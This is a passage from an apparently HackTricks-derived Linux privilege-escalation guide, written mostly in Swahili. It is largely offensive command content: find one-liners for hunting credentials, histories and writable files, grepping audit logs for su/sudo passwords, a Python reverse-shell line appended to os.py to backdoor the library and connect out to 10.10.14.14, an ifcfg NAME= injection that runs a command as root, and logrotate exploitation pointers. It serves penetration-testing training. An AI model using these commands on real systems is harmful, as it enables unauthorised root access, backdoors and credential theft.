for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafaili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripti/Bainari kwenye PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na nywila**.\
Chombo kingine cha kuvutia unachoweza kutumia kwa hili ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, huenda ukapata **taarifa za kuvutia/zinazosiri ndani yao**. Kama logs itakuwa ya kushangaza zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya "**bad**" configured (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zinazoambatanisha neno "**password**" katika **jina** lao au ndani ya **maudhui**, na pia kuangalia IPs na barua pepe ndani ya logs, au regexps za hashes.\
Sitingeorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho unaofanywa na [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** script ya python itaendeshwa na **unaweza kuandika ndani** ya folda hiyo au unaweza **kubadilisha python libraries**, unaweza kubadilisha OS library na backdoor it (kama unaweza kuandika mahali script ya python itaendeshwa, nakili na weka maktaba ya os.py).

To **backdoor the library** ongeza tu mwishoni mwa maktaba ya os.py mstari ufuatao (badilisha IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utekelezaji wa Logrotate

Udhaifu katika `logrotate` huruhusu watumiaji wenye **ruhusa za kuandika** kwenye faili ya logi au kwenye saraka za mzazi wake kupata kwa uwezekano ruhusa zilizoongezeka. Hii ni kwa sababu `logrotate`, mara nyingi ikiwaka kama **root**, inaweza kuchukiwa ili kutekeleza faili lolote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo mzunguko wa logi unafanywa.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` na zile za zamani

Taarifa zaidi kuhusu udhaifu huo zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua kuwa unaweza kubadilisha logs, angalia nani anasimamia hizo logs na angalia ikiwa unaweza kupandisha ruhusa kwa kuchukua nafasi ya logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** skiripti ya `ifcf-<whatever>` hadi _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** ile iliyopo, basi **system is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinaonekana kama faili za .INI. Hata hivyo, zina\~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` iliyowekwa katika skiripti hizi za mtandao haishughulikii kwa usahihi. Kama una **nafasi tupu katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi tupu**. Hii inamaanisha kuwa **kila kitu baada ya nafasi tupu ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Katalogi `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala kwenye systems za Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** uliotangazwa na Ubuntu, unaotumia configuration files kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, SysVinit scripts bado zinatumika sambamba na konfigurasi za Upstart kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** inatokea kama mfumo wa kisasa wa initialization na usimamizi wa huduma, ukitoa vipengele vya juu kama kuanzisha daemons kwa mahitaji (on-demand daemon starting), usimamizi wa automount, na snapshots za hali ya mfumo (system state snapshots). Inaweka faili katika `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya administrator, ikorahisisha mchakato wa usimamizi wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua uwezo wa kernel wenye vibali kwa userspace manager. Uthibitishaji dhaifu wa manager (mfano, signature checks based on FD-order au poor password schemes) unaweza kuruhusu app ya ndani kuigiza manager na kupanda hadi root kwenye vifaa tayari vime-root. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Chombo bora kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
